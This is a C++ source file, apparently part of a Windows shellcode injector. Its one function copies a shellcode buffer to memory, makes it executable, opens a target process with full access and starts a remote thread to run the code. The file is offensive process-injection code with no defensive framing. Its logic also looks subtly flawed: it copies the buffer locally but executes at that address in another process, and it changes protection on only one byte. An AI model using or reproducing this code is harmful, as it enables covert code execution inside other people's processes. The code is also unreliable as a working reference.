#include <windows.h>
#include "ExecHeap.h"
#include "logger.h"
#include "utilities.h"

BOOL WriteAndExec(DWORD pid, LPVOID address, LPCSTR shellcode, SIZE_T size) {
  Logger& logger = Logger::getInstance();

#ifdef DEBUG
  LOG_CALL("pid = %lu, address = %p, shellcode = %p, size = %lu", pid, address, shellcode, size);
#endif

  memcpy(address, shellcode, size);
  DWORD oldProtect;

  if (!VirtualProtect(address, 1, PAGE_EXECUTE_READ, &oldProtect)) {
    VirtualFree(address, 0, MEM_RELEASE);
    LOG_ERROR("Proteciton change failed.");
    return FALSE;
  }
  HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

  if (processHandle == NULL) {
    VirtualFree(address, 0, MEM_RELEASE);
    LOG_ERROR("Opening a handle failed.");
    return FALSE;
  }

  LPTHREAD_START_ROUTINE threadStart = (LPTHREAD_START_ROUTINE)address;
  HANDLE threadHandle = CreateRemoteThread(processHandle, NULL, 0, threadStart, NULL, 0, NULL);

  if (threadHandle == NULL) {
    CloseHandle(processHandle);
    VirtualFree(address, 0, MEM_RELEASE);
    LOG_ERROR("Thread creation failed.");
    return FALSE;
  }

  CloseHandle(threadHandle);
  CloseHandle(processHandle);

  return TRUE;
}
